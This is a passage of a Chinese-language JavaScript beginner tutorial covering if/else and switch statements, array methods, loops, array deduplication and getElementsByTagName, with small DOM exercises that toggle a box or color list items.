class="keyword">else</span> &#123;</span><br><span class="line">        sTr = <span class="string">'小于'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    alert(sTr);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-7-3-理解练习"><a href="#9-7-3-理解练习" class="headerlink" title="9.7.3 理解练习"></a>9.7.3 <strong>理解练习</strong></h3><p>制作单个按钮点击切换元素的显示和隐藏效果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oBtn = <span class="built_in">document</span>.getElementById(<span class="string">"btn01"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">"box01"</span>);</span></span><br><span class="line"><span class="javascript">        oBtn.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (oDiv.style.display == <span class="string">"none"</span>) &#123;</span></span><br><span class="line"><span class="javascript">                oDiv.style.display = <span class="string">'block'</span>;</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                oDiv.style.display = <span class="string">"none"</span>;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="undefined">        width: 200px;</span></span><br><span class="line"><span class="undefined">        height: 400px;</span></span><br><span class="line"><span class="undefined">        background-color: gold;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"切换"</span> <span class="attr">id</span>=<span class="string">"btn01"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span> <span class="attr">id</span>=<span class="string">"box01"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-7-4-多重if-else语句"><a href="#9-7-4-多重if-else语句" class="headerlink" title="9.7.4 多重if else语句"></a>9.7.4 <strong>多重if else语句</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iNow = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(iNow==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ... ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(iNow==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ... ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    ... ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-7-5-switch语句"><a href="#9-7-5-switch语句" class="headerlink" title="9.7.5 switch语句"></a>9.7.5 <strong>switch语句</strong></h3><p>多重if else语句可以换成性能更高的switch语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iNow = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (iNow)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">break</span>;    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-7-6-理解练习"><a href="#9-7-6-理解练习" class="headerlink" title="9.7.6 理解练习"></a>9.7.6 <strong>理解练习</strong></h3><p>制作随着星期换背景的页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iWeek = <span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oBody = <span class="built_in">document</span>.getElementById(<span class="string">"body01"</span>);</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">            <span class="keyword">switch</span> (iWeek) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">case</span> <span class="number">1</span>:</span></span><br><span class="line"><span class="javascript">                    oBody.style.backgroundColor = <span class="string">"gold"</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">case</span> <span class="number">2</span>:</span></span><br><span class="line"><span class="javascript">                    oBody.style.backgroundColor = <span class="string">"pink"</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">case</span> <span class="number">3</span>:</span></span><br><span class="line"><span class="javascript">                    oBody.style.backgroundColor = <span class="string">"red"</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">case</span> <span class="number">4</span>:</span></span><br><span class="line"><span class="javascript">                    oBody.style.backgroundColor = <span class="string">"green"</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">case</span> <span class="number">5</span>:</span></span><br><span class="line"><span class="javascript">                    oBody.style.backgroundColor = <span class="string">"yellow"</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">default</span> :</span></span><br><span class="line"><span class="javascript">                    oBody.style.backgroundColor = <span class="string">"blue"</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"body01"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-8-数组及操作方法"><a href="#9-8-数组及操作方法" class="headerlink" title="9.8 数组及操作方法"></a>9.8 数组及操作方法</h2><p>数组就是一组数据的集合，javascript中，数组里面的数据可以是不同类型的。</p><h3 id="9-8-1-定义数组的方法"><a href="#9-8-1-定义数组的方法" class="headerlink" title="9.8.1 定义数组的方法"></a>9.8.1 <strong>定义数组的方法</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对象的实例创建</span></span><br><span class="line"><span class="keyword">var</span> aList = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接量创建</span></span><br><span class="line"><span class="keyword">var</span> aList2 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'asd'</span>];</span><br></pre></td></tr></table></figure><h3 id="9-8-2-操作数组中数据的方法"><a href="#9-8-2-操作数组中数据的方法" class="headerlink" title="9.8.2 操作数组中数据的方法"></a>9.8.2 <strong>操作数组中数据的方法</strong></h3><p>1、获取数组的长度：aList.length;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">alert(aList.length); <span class="comment">// 弹出4</span></span><br></pre></td></tr></table></figure><p>2、用下标操作数组的某个数据：aList[0];</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">alert(aList[<span class="number">0</span>]); <span class="comment">// 弹出1</span></span><br></pre></td></tr></table></figure><p>3、join() 将数组成员通过一个分隔符合并成字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">alert(aList.join(<span class="string">'-'</span>)); <span class="comment">// 弹出 1-2-3-4</span></span><br></pre></td></tr></table></figure><p>4、push() 和 pop() 从数组最后增加成员或删除成员</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">aList.push(<span class="number">5</span>);</span><br><span class="line">alert(aList); <span class="comment">//弹出1,2,3,4,5</span></span><br><span class="line">aList.pop();</span><br><span class="line">alert(aList); <span class="comment">// 弹出1,2,3,4</span></span><br></pre></td></tr></table></figure><p>5、unshift()和 shift() 从数组前面增加成员或删除成员</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">aList.unshift(<span class="number">5</span>);</span><br><span class="line">alert(aList); <span class="comment">//弹出5,1,2,3,4</span></span><br><span class="line">aList.shift();</span><br><span class="line">alert(aList); <span class="comment">// 弹出1,2,3,4</span></span><br></pre></td></tr></table></figure><p>6、reverse() 将数组反转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">aList.reverse();</span><br><span class="line">alert(aList);  <span class="comment">// 弹出4,3,2,1</span></span><br></pre></td></tr></table></figure><p>7、indexOf() 返回数组中元素第一次出现的索引值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">alert(aList.indexOf(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>8、splice() 在数组中增加或删除成员</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">aList.splice(<span class="number">2</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>); <span class="comment">//从第2个元素开始，删除1个元素，然后在此位置增加'7,8,9'三个元素</span></span><br><span class="line">alert(aList); <span class="comment">//弹出 1,2,7,8,9,4</span></span><br></pre></td></tr></table></figure><h3 id="9-8-3-多维数组"><a href="#9-8-3-多维数组" class="headerlink" title="9.8.3 多维数组"></a>9.8.3 <strong>多维数组</strong></h3><p>多维数组指的是数组的成员也是数组的数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]];</span><br><span class="line"></span><br><span class="line">alert(aList[<span class="number">0</span>][<span class="number">1</span>]); <span class="comment">//弹出2;</span></span><br></pre></td></tr></table></figure><p>批量操作数组中的数据，需要用到循环语句</p><h2 id="9-9-循环语句"><a href="#9-9-循环语句" class="headerlink" title="9.9 循环语句"></a>9.9 循环语句</h2><p>程序中进行有规律的重复性操作，需要用到循环语句。</p><h3 id="9-9-1-for循环"><a href="#9-9-1-for循环" class="headerlink" title="9.9.1 for循环"></a>9.9.1 <strong>for循环</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-9-2-课堂练习"><a href="#9-9-2-课堂练习" class="headerlink" title="9.9.2 课堂练习"></a>9.9.2 <strong>课堂练习</strong></h3><p>1、将数组中的数据分别用弹框弹出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        alert(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> aList = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>];</span><br><span class="line">    <span class="keyword">var</span> iLen = aList.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; iLen; i++) &#123;</span><br><span class="line">        alert(aList[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>2、将数组中的数据放入到页面中的列表中</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type="text/javascript"&gt;</span><br><span class="line">    window.onload = function () &#123;</span><br><span class="line">        var oLl = document.getElementsByTagName("li");</span><br><span class="line">        var aList = ['apple', 'banana', 'orange', 'xigua', 'boluo'];</span><br><span class="line">        var aLen = aList.length;</span><br><span class="line">        for (var i = 0; i &lt; aLen; i++) &#123;</span><br><span class="line">            var name = aList[i];</span><br><span class="line">            // 获取标签内的值</span><br><span class="line">            oLl[i].innerHTML = name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="selector-tag">ul</span>&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">// 另一种方法</span><br><span class="line">&lt;script type="text/javascript"&gt;</span><br><span class="line">    window.onload = function () &#123;</span><br><span class="line">        var oUl = document.getElementById('list');</span><br><span class="line">        var aList = ['apple', 'banana', 'orange', 'xigua', 'boluo'];</span><br><span class="line">        var aLen = aList.length;</span><br><span class="line">        var sTr = '';</span><br><span class="line">        for (var i = 0; i &lt; aLen; i++) &#123;</span><br><span class="line">            sTr += '&lt;li&gt;' + aList[i] + '&lt;/li&gt;';</span><br><span class="line">            oUl.innerHTML = sTr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.list</span> &#123;</span><br><span class="line">        <span class="attribute">list-style</span>: none;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">305px</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.list</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">        <span class="attribute">border-bottom</span>: <span class="number">1px</span> dotted <span class="number">#000</span>;</span><br><span class="line">        <span class="attribute">line-height</span>: <span class="number">60px</span>;</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;ul class="list" id="list"&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><h3 id="9-9-3-while循环"><a href="#9-9-3-while循环" class="headerlink" title="9.9.3 while循环"></a>9.9.3 <strong>while循环</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">8</span>)&#123;</span><br><span class="line">    ......</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-9-4-数组去重"><a href="#9-9-4-数组去重" class="headerlink" title="9.9.4 数组去重"></a>9.9.4 <strong>数组去重</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aList = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> aList2 = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;aList.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(aList.indexOf(aList[i])==i)</span><br><span class="line">    &#123;</span><br><span class="line">        aList2.push(aList[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alert(aList2);</span><br></pre></td></tr></table></figure><h2 id="9-10-获取元素方法二"><a href="#9-10-获取元素方法二" class="headerlink" title="9.10 获取元素方法二"></a>9.10 获取元素方法二</h2><p>可以使用内置对象document上的getElementsByTagName方法来获取页面上的某一种标签，获取的是一个选择集，不是数组，但是可以用下标的方式操作选择集里面的标签元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> aLi = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'li'</span>);</span><br><span class="line">        <span class="comment">// aLi.style.backgroundColor = 'gold'; // 出错！不能同时设置多个li</span></span><br><span class="line">        alert(aLi.length);</span><br><span class="line">        aLi[<span class="number">0</span>].style.backgroundColor = <span class="string">'gold'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">....</span></span><br><span class="line"><span class="regexp">&lt;ul&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;1&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">2</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;3&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">4</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;5&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">6</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br></pre></td></tr></table></figure><p><strong>课堂练习</strong><br>使用循环操作列表中的每个元素</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 通过标签名称获取li元素，生成一个选择集，赋值给aLi</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> aLi = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'li'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 读取选择集内元素的个数</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//alert(aLi.length);  // 弹出13</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> iLen = aLi.length;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//给一个li设置背景色</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//aLi[0].style.backgroundColor = 'gold';</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 